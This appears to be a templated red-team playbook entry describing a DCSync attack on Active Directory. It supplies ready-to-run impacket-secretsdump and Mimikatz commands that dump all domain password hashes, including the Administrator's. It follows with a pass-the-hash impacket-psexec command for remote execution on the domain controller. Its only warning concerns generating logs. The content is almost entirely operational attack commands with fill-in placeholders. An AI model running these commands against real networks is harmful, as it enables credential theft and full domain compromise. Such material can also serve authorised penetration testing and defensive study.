name: DCSync Attack
content:
Perform a DCSync attack on {domain} with the supplied credentials.

**Prerequisites :**
The account must have these rights :
- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All

**Impacket secretsdump :**
```bash
# All hashes
impacket-secretsdump {domain}/{username}:'{password}'@{dc_ip}

# Hash of a specific user
impacket-secretsdump {domain}/{username}:'{password}'@{dc_ip} -just-dc-user Administrator
```

**With Mimikatz (if DC access is available) :**
```
lsadump::dcsync /domain:{domain} /user:Administrator
lsadump::dcsync /domain:{domain} /all /csv
```

**Post-exploitation :**
```bash
# Pass-the-hash with the Administrator NT hash
impacket-psexec -hashes :NTHASH Administrator@{dc_ip}
```

⚠️ DCSync generates substantial log activity. Use with caution.
